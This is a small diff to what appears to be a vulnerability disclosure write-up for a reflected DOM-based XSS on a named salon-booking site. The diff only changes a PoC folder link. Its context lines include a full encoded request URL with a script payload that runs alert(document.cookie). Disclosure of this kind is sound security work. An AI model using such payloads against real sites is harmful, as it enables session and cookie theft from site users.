@@ -43,7 +43,7 @@ Full request example:
 https://studio.salonory.com/search-result/?search-article=%22%2526quot%253B%3E%3B%3Cscript%20src=https://studio.salonory.com/search-result/?%20onload=alert(document.cookie)%20%3E%3C/script%3E
 ```
 
-A PoC recording and screenshot are included in [`poc/`](./poc/out.mp4).
+A PoC recording and screenshot are included in [`poc/`](./poc).
 
 ![Reflected DOM-Based XSS PoC](./poc/XSS.png)
 
